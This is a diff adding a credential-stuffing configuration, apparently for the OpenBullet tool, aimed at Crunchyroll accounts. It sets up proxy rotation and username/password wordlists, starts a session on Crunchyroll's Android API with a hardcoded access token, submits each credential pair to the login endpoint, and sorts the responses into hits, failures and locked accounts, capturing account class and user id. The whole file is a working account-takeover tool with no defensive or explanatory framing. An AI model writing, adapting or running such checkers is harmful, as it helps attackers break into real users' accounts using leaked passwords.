@@ -1,0 +1,62 @@
+[SETTINGS]
+{
+  "Name": "Crunchyroll",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-07T18:09:43.3631439+02:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "sp6off",
+  "Version": "1.2.1.2",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Connect REQUEST POST "https://api.crunchyroll.com/start_session.0.json" AutoRedirect=FALSE 
+  CONTENT "locale=&device_id=faplulz&device_type=com.crunchyroll.crunchyroid&access_token=Scwg9PRRZ19iVwD&version=422" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Dalvik/1.6.0 (Linux; U; Android 8.1.0)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Connection: Keep-Alive" 
+
+PARSE "<SOURCE>" JSON "session_id" -> VAR "SessionID" 
+
+#Login REQUEST POST "https://api.crunchyroll.com/login.0.json" AutoRedirect=FALSE 
+  CONTENT "account=<USER>&password=<PASS>&locale=enUS&session_id=<SessionID>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Dalvik/1.6.0 (Linux; U; Android 8.1.0)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Connection: Keep-Alive" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"code\":\"ok\"" 
+  KEYCHAIN Failure OR 
+    KEY "\"Incorrect login information.\"" 
+  KEYCHAIN Ban OR 
+    KEY "\"Your account has been locked.\"" 
+  KEYCHAIN Ban OR 
+    KEY "\"Internal server error.\"" 
+
+PARSE "<SOURCE>" LR "\"class\":" "," -> VAR "Class" 
+
+PARSE "<SOURCE>" LR "\"user_id\":" "," -> VAR "user_ID" 
+
